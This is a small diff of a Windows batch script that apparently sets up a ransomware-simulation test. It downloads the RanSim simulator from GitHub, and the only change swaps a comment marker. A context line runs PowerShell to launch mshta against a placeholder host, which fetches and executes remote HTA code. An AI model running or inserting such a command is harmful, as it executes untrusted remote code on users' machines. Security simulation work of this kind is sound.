@@ -2,7 +2,7 @@
 setlocal
 powershell.exe -Command "mshta http://<ip address>/<endpoint>"
 rem Define variables
-#installing the RanSim from the github
+rem installing the RanSim from the github
 set "githubUrl=https://github.com/lawndoc/RanSim/archive/main.zip"
 set "outputPath=%USERPROFILE%\Downloads\ransom.zip"
 set "extractPath=%USERPROFILE%\Downloads\"
